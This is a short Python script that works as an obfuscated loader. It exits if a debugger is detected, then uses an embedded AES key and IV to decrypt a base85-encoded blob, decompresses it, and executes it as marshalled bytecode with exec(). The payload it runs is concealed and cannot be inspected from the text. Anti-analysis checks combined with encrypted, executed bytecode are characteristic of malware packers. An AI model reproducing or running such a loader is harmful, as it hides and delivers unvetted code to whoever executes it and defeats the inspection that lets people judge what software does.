
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xcbN\xf3\xe0<\x04\xc5T\xb5\xe5\xdd\x07u\xf1\xea\xca*=\x85N\xbc\xaf\xfb\xc3\xd9\xfbc\x93q\xf2\xc0\xc3'
_IV = b'\xbd\x810`#m\x11\xbb\xe9j\xae2\xbaE\xc1s'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'j!`uYZK#gVUeMqP99YSuJ_t`*4o0AdwK56^KbrK3$eBF+qFQLQ?+$?4ykS@zQ%Hs7!hq}xP(!A6$KZbEj<u`=&70Mh13fYs$I>JXvu0DSHch483?!R3Y_4QMz9Ap`zOP3;rPKga@uRLRlfX)k0prg;c&nk{2y`K){t$o*kXr+wU{`T>I&OUwyhN6DewK*V096t5)ofZ1f}Hqg)B-2n4)c=|Uw~4ynOxwnwAtg89vdX6exh7sMnozL4B7Cno58Mt+<MiYie_3!W7WNv=Fp1u;5{6KPt}02Q=fn18nMf($eZQdyEQ~JvU)7bq_}B$dk3l>YUZwDdNkFWD*=L_Je|wkmG---(cl^`VrL;i>PPDp(~|+w62htBU1+XyAEt!ycanhvqmv97&1yVmz2jle_i!O~PLE%hFetPms{yf0As2i|flxVZbELPKp6Q2saocKeuF-{T<cU+3(qQUTBV>2P@kYNbVIAH-It2tj_OKBEs=v<<ZZQ*2T23VGbjEazYW}2b8vFNIb?%&~vZlKJ!FkrmI76=?nx5H<<h3v6t@&G$vS3ZS<19&*kQeyc{`DA22}>_W0gf-ZQO4nuR6-IJWBx1a7?u2U;PKczZV~YeD{iGWEA=8x=t}D6vy<oubXoWGvJZ9rJ4YU5l9hGk-{U7{r;P+yPOX$^Z!%J`yU{+`^b1hZ)7wctR#08b21g$T>otzgjv#sSl3hPpX?Ts@Cg)tae|yT1TNiVPyUR5vtIKSRy%dZ$It)Fy+@>oAp)N2W<6ZhCs#pfl;PFh>k=-{H0~JzZ?PZ>PX7b+uv+K}e>U;7<aJl03w?<4~2L<70k)5HXAf0v@7Y(tc5gBVL'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        